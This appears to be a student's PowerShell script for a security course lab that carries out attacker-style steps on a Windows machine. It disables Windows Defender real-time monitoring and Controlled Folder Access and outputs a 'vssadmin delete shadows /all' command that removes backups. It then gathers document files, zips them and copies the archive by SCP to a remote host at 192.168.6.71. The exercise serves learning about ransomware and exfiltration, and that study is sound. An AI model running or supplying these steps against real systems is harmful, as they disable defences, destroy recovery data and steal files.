# Task 2
# 1. Find the Powershell cmdlet to disable Windows Defender.  Be sure you use the options to the cmdlet that disables Controlled 
# Folder Access too. 

#This part of the code essentially disables the Windows Defender and disables all Controlled Folder Access
#Must be an admin
Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled

#This part of the code allows for remote restore points and deletes volume shadow copies
Write-Output "vssadmin delete shadows /all"

# Task 1: Search the filesystem (use the "Documents" folder from Week 12 to represent the filesystem) for docx, xlsx, pdf, and txt
# files and copy those to a new folder of your choice.  Zip the folder containing the files using the Powershell cmdlet.  
# Use Powershell to scp the zipped file over to 192.168.6.71 port 2222..

#This searches the folder Documents and looks for docx, xlsx, pdf, and txt files 

Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\Documents | `
Move-Item -Destination C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem

#This combines and compresses files that were found into a zip

Compress-Archive -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem -DestinationPath `
C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem_Zip.zip

#This essentially exports any found files into a csv file

Get-Childitem -recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem | Export-CSV -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem.csv

Install-Module -Name Posh-SSH

#This part of the code moves the zip file to the ssh remote host

Set-SCPItem -Computername '192.168.6.71' -Port 2222 -Credential (Get-Credential jahseem.maxwell) `
-Destination '/home/jahseem.maxwell' -Path '\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week13\homework\FileSystem_Zip.zip'
